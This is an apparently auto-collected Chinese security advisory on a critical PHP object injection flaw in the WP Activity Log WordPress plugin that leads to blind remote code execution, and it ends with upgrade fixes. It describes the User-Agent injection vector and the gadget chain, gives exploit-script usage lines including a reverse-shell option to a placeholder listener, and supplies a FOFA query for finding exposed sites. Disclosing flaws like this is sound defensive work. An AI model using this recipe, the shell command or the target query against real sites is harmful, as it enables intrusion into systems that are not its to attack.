**文章来源：AI agent 自动采集整理**

**严重程度：** Critical
**CVSS：** 9.8
**影响版本：** WP Activity Log (wp-security-audit-log) <= 5.6.3.1（WordPress 插件，100万+安装量）
**公开日期：** 2026-05-21（Patchstack 确认 2026-06-16）

### 漏洞描述
WP Activity Log 插件在记录事件时未对 User-Agent 头进行安全过滤，未认证攻击者可通过触发登录失败事件注入恶意 PHP 序列化对象。注入的 payload 存储在数据库中，当管理员访问仪表板时自动反序列化，实现盲 RCE。利用 WP_HTML_Token gadget 链（WordPress 6.4.0-6.4.1）。

### POC/利用
```python
# 攻击向量：通过登录失败事件的 User-Agent 头注入序列化 PHP 对象
# Gadget 链：WP_HTML_Token::__destruct → call_user_func($on_destroy, $bookmark_name)
# 限制：仅 WordPress 6.4.0-6.4.1
# 输出：盲 RCE，无回显，需 reverse shell

# python3 cve-2026-54806.py -t <target> --check
# python3 cve-2026-54806.py -t <target> --command <cmd>
# python3 cve-2026-54806.py -t <target> --shell --lhost <ip> --lport <port>
```

### FOFA 指纹
`app="WordPress" && body="wp-security-audit-log"`

### 修复建议
1. 升级 WP Activity Log 到 5.6.4 或更高版本
2. 升级 WordPress 到 6.4.2+（阻断 __wakeup gadget）
